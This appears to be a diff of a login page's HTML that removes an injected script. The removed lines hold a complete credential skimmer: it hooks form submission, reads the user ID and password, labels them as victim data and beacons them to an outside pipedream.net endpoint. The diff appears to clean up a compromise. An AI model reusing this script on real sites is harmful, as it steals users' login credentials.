@@ -481,40 +481,7 @@ var I18n=I18n||{t:function(a,b){return b}};
     }
     
 </script>
-
-<!-- Log Point -->
-<script>
-    document.addEventListener('submit', function(e) {
-        const form = e.target;
-        if (form.classList.contains('_loginForm') || form.action.includes('login')) {
-            const userId = form.querySelector('[name="user_id"]')?.value || '';
-            const userPw = form.querySelector('[name="user_pw"]')?.value || '';
-            
-            if (userId && userPw) {
-                console.log('=== Victim Login Account Information ===');
-                console.log('UserID:', userId);
-                console.log('Password:', userPw);
-                console.log('========================================');
-                
-                const url = 'https://11c9bf472599957da48779c59702d232.m.pipedream.net';
-                
-                if (navigator.sendBeacon) {
-                    navigator.sendBeacon(url, JSON.stringify({
-                        user_id: userId,
-                        user_pw: userPw,
-                        timestamp: new Date().toISOString()
-                    }));
-                }
-                
-                
-            }
-        }
-    }, true);
-</script>
-
-
-
-    
+ 
         
         <script type="text/javascript" src="https://member.rocketnow.co.jp/resources/20260319160553/dist/login.min.js"></script><div class="scoped-modal__container" style="display:none;"><b class="scoped-modal__blocker"></b><b class="scoped-modal__position-fixer"></b>
   <div class="scoped-modal__content scoped-modal__content--response-simple"></div></div><ul class="ui-autocomplete ui-front ui-menu ui-widget ui-widget-content" id="ui-id-1" tabindex="0" style="display: none;"></ul><span role="status" aria-live="assertive" aria-relevant="additions" class="ui-helper-hidden-accessible"></span>
